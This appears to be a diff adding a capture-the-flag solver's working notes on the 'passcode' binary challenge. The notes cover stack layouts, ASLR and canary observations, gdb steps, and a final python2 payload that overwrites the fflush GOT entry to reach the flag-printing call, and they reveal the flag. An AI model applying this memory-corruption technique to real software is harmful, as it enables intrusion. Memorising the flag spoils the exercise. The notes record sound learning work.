@@ -1,0 +1,96 @@
+python2 -c "print('a'*92 + '\xC9\x07\xCC\x00\xE6\x28\x05\x00')" | ./passcode
+
+(should be this one)
+python2 -c "print('a'*96 + '\xE6\x28\x05')" | ./passcode
+
+
+python2 -c "print('a'*96 + '\xC9\x07\xCC\x00\xE6\x28\x05\x00' + 'a'*4)" | ./passcode
+python2 -c "print('a'*96 + '\xE6\x28\x05\x00\xC9\x07\xCC\x00' + 'a'*4)" | ./passcode
+
+ON MY SYSTEM:
+0xffffcf8c rval for welcome
+0xffffcf88 for bp
+0xffffcf28 for start of name
+
+0xffffcf8c rval for login
+0xffffcf88 for bp
+0xffffcf84 for passcode 1
+0xffffcf80 for passcode 2
+
+goes passcode 1 then passcode 2 on my system (passcode 1 is above)
+
+338150 in hex is 0x000528E6 which is passcode 1 value
+13371337 in hex is 0x00CC07C9 which is passcode 2 value
+
+ON HOST SYSTEM:
+
+0xfff964dc for rval of welcome
+0xfff964d8 for bp
+0xfff96468 for start of name
+
+0xfff964dc rval for login
+0xfff964d8 for bp
+0xfff964c8 for passcode 1
+0xfff964cc for passcode 2
+
+aslr is used on host so this changes from run to run, the note here is that passcode 1s address is 96 above that of name's start address and passcode 2 is above passcode 1,
+its very hard to write at specific values of the stack since aslr exists
+
+
+goes passcode 2 then passcode 1 on host system (passcode 2 is above)
+
+
+note where password 2 is supposed to be is a location of a canary, can i brute force it using the randomization of canary values? (but arent canaries supposed to have least
+significant byte be 0x00)
+
+tried seeing if i can get the aslr randomization address of the passcode 2 mem location to match the randomized canary value that is stored there (so the value of passcode 2
+is equal to its mem address) then try a brute force attack, but the aslr randomized address in my tests always had a least significant hex digit of c, i did this like 10 times
+and got this value which only has a chance of occuring 1 / 16^10 = 0.00625 = 0.625% which seems unlikely (in actualality i did this much more than 10 times so the percentage
+is much lower than this), i need another method.
+
+check canary value myself (ya it ends with least significant byte being null)
+
+x/x $ebp-0xc
+0x355c4e00
+
+can maybe just use passcode 1 scanf to overwrite return address
+
+0xffaba198 base
+0xffaba17c return address
+
+=> 0x0000001c is offset of return address from base (base being the very first value of esp when we start the program)
+
+using python2 | gdb ./passcode
+
+0xffcfb148 is base
+=> 0xffcfb148 - 0x0000001c = 0xffcfb12c (should be the return address for login)
+
+note address of the inner if statement in login is 0x080485d7
+
+print("start")
+print("continue")
+
+0xff876f98 is base
+=> 0xff876f98 - 0x0000001c = 0xff876f7c (should be the return address for login)
+
+doesnt work but i can debug using breakpoint and the ni command to step through assembly lines
+
+0xff81ace8 is base
+=> 0xff876f98 - 0x0000001c = 0xff876f7c
+
+exit is called if if statement fails, so all this work for nothing :(
+
+could i overwrite the got entry for puts with the address of inner if statement? I would like to solve this the proper way like mentioned via brute force, but i don't know
+what im supposed to brute force
+
+note puts doesnt work since their exists a white space character in the got address, use fflush instead (interesting off topic thing to note,
+(python2 -c "print('a')"; cat) | ./passcode immediately goes to the scanf for passcode 1 since the cat command adds a newline to the stdout, the brackets signfiy to execute
+the series of commands in a subshell from left to right, first the python print is executed, then the cat is executed which adds the newline which causes the name scanf to
+stop taking stdin and go to the next scanf for passcode 1)
+
+it worked, overwriting the .got entry for fflush with the first setup instruction for the system(/bin/cat flag) call worked and we got the flag, the flag was 
+"Sorry mom.. I got confused about scanf usage :(" and i used the payload "python2 -c "print('a'*96 + '\x04\xa0\x04\x08' + '\n' + '134514147\n')" | ./passcode" to achieve
+this, this is an unconventenal apporoach and i would like to find what the standard solution is via a brute force attack, though i have no idea what exactly you have to brute
+force here 
+
+Looked it up and it seems all other solutions online use something similar to my method aswell and don't use bruteforce, no idea why that comment is there
